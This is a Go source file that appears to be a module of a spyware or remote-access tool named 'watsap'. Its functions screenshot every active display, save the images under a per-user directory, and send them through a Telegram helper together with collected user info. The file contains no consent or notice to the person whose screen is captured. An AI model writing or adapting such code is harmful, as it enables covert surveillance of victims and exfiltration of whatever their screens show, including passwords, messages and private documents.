package screen

import (
	"fmt"
	"image/png"
	"os"
	"watsap/utils/config"
	"watsap/utils/logger"
	"watsap/utils/messages"
	"watsap/utils/telegram"

	"github.com/kbinani/screenshot"
)

var FileName = ""

// take fullscreen screenshot
func TakeScreenshot() {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		logger.Warn("Screen", "Headless system, no active displays")
		return
	}

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			logger.Error("Screen", "Failed to capture screen %d: %v", i, err)
			continue
		}
		
		fileName := getScreenshotFile(i)
		file, err := os.Create(fileName)
		if err != nil {
			logger.Error("Screen", "Failed to create file %s: %v", fileName, err)
			continue
		}

		if err := png.Encode(file, img); err != nil {
			logger.Error("Screen", "Failed to encode PNG %s: %v", fileName, err)
		}
		file.Close()
		
		logger.Info("Screen", "Screenshot saved to: %s", fileName)
	}
}

func SendScreenshot() {
	n := screenshot.NumActiveDisplays()
	for i := 0; i < n; i++ {
		fileName := getScreenshotFile(i)
		telegram.TgSendFile(fileName, messages.GetUserInfoMsg())
		if config.DebugMode {
			os.Remove(fileName)
		}
	}
}

func getScreenshotFile(index int) string {
	return fmt.Sprintf("%s/%s-screenshot-%d.png", config.WaDir, *config.UserID, index)
}

func InitScreen() {
	TakeScreenshot()
	SendScreenshot()
}
